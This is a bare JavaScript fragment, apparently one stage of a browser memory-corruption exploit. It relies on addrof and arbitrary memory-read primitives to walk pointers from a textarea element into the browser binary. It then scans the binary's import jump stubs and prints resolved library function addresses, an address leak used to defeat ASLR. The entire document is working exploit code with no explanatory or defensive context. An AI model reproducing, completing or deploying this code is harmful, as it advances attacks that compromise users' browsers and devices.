var ta = document.createElement('textarea');

var ptr_0 = addrof(ta) + 0x18;
print("ptr_0 = "+hex(ptr_0));
var ptr_1 = read_ptr_at(ptr_0);
print("ptr_1 = "+hex(ptr_1));
var ptr_2 = read_ptr_at(ptr_1);
print("ptr_2 = "+hex(ptr_2));
var ptr_3 = read_ptr_at(ptr_2);
print("ptr_3 = "+hex(ptr_3));
var ptr_4 = ptr_3 - 17100888;

while(true)
{
    var q = read_mem(ptr_4 - 16, 2);
    if(q[0] != 0xff || q[1] != 0x25)
        break;
    print("decrement!");
    ptr_4 -= 16;
}

while(true)
{
    var q = read_mem(ptr_4, 6);
    if(q[0] != 0xff || q[1] != 0x25)
        break;
    var offset = 0;
    for(var i = 5; i >= 2; i--)
        offset = offset * 256 + q[i];
    offset += ptr_4 + 6;
    ptr_4 += 16;
    print(hex(read_ptr_at(offset)));
}
